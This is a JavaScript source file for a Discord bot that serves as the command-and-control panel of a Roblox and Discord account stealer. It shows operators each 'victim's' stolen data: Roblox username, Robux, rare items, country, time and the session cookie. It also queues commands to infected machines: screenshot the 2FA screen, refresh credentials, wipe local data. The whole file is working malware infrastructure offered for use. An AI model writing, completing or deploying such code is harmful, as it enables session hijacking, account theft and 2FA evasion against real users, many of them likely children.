// api/bot-gateway.js - BOT QUE USA GATEWAY (NO WEBHOOKS)
import { Client, GatewayIntentBits } from 'discord.js';

// Crear cliente (se conecta por Gateway)
const client = new Client({ 
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ] 
});

let botIniciado = false;

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    // Iniciar bot si no está iniciado
    if (!botIniciado) {
        try {
            await client.login(process.env.DISCORD_BOT_TOKEN);
            botIniciado = true;
            console.log('✅ Bot conectado por Gateway');
            
            // Escuchar interacciones (botones)
            client.on('interactionCreate', async (interaction) => {
                if (!interaction.isButton()) return;
                
                const customId = interaction.customId;
                const partes = customId.split('_');
                const action = partes[0];
                const userId = partes.slice(1).join('_');
                
                // Obtener datos de la víctima
                const victimData = global.victims?.[userId] || {};
                const r = victimData.roblox || {};
                
                // ROBLOX
                if (action === 'roblox') {
                    const mensaje = `||@here||
🔔 ¡Informacion seleccionada: **ROBLOX**!

**📌 PRINCIPAL **
👤 Usuario Roblox: ${r.username || 'No disponible'}
🆔 ID: ${r.userId || 'No disponible'}
💰 Robux: ${r.robux || 0}
⭐ Seguidores: ${r.seguidores || 0}
👥 Amigos: ${r.amigos || 0}
💱 Premium: ${r.premium || 'No'}
🔰 Verificado: ${r.verified || 'No'}

💼 **Inventario:**
Headless: \`${r.headless || 'No'}\`
Korblox: \`${r.korblox || 'No'}\`

**🌐 Informacion Horaria:**
🌍 País: \`${victimData.pais || 'Desconocido'}\`
📅 Fecha: \`${victimData.fecha || ''}\`
⏰ Hora Exacta: \`${victimData.hora || ''}\`

🍪 Cookie:
\`\`\`${victimData.cookie || 'No disponible'}\`\`\``;
                    
                    await interaction.reply({ content: mensaje, ephemeral: true });
                }
                
                // DISCORD
                if (action === 'discord') {
                    const mensaje = `||@here||
🔔 ¡Informacion seleccionada: **DISCORD**!

**📌 PRINCIPAL **
👤 Usuario Discord: (No disponible)
🆔 ID de Discord: (No disponible)
👥 Amigos: (No disponible)
💱 Discord nitro: (No disponible)

**🌐 Informacion Horaria:**
🌍 País: \`${victimData.pais || 'Desconocido'}\`
📅 Fecha: \`${victimData.fecha || ''}\`
⏰ Hora Exacta: \`${victimData.hora || ''}\`

✨ Token de sesión:
\`\`\`No disponible\`\`\``;
                    
                    await interaction.reply({ content: mensaje, ephemeral: true });
                }
                
                // COMANDOS
                if (action === 'comandos') {
                    await interaction.reply({
                        content: `||@here||
✏️ **¡ Comandos seleccionados ! **
Elige Una Opcion:`,
                        ephemeral: true,
                        components: [
                            {
                                type: 1,
                                components: [
                                    { type: 2, style: 4, label: '📸 Capturar pantalla del 2FA', custom_id: `capturar_pantalla_${userId}` }
                                ]
                            },
                            {
                                type: 1,
                                components: [
                                    { type: 2, style: 1, label: '🔄 Actualizar credenciales', custom_id: `actualizar_credenciales_${userId}` }
                                ]
                            },
                            {
                                type: 1,
                                components: [
                                    { type: 2, style: 4, label: '🗑️ Limpiar datos locales', custom_id: `limpiar_datos_${userId}` }
                                ]
                            }
                        ]
                    });
                }
                
                // Subcomandos
                if (['capturar_pantalla', 'actualizar_credenciales', 'limpiar_datos'].includes(action)) {
                    if (!global.commands) global.commands = {};
                    if (!global.commands[userId]) global.commands[userId] = [];
                    global.commands[userId].push({ action });
                    
                    await interaction.reply({ 
                        content: `✅ Orden \`${action}\` enviada a la víctima.`,
                        ephemeral: true 
                    });
                }
            });
            
        } catch (error) {
            console.error('❌ Error iniciando bot:', error);
        }
    }
    
    res.status(200).json({ 
        status: 'Bot Gateway funcionando',
        bot: botIniciado ? '✅ Conectado' : '⚠️ Iniciando...'
    });
}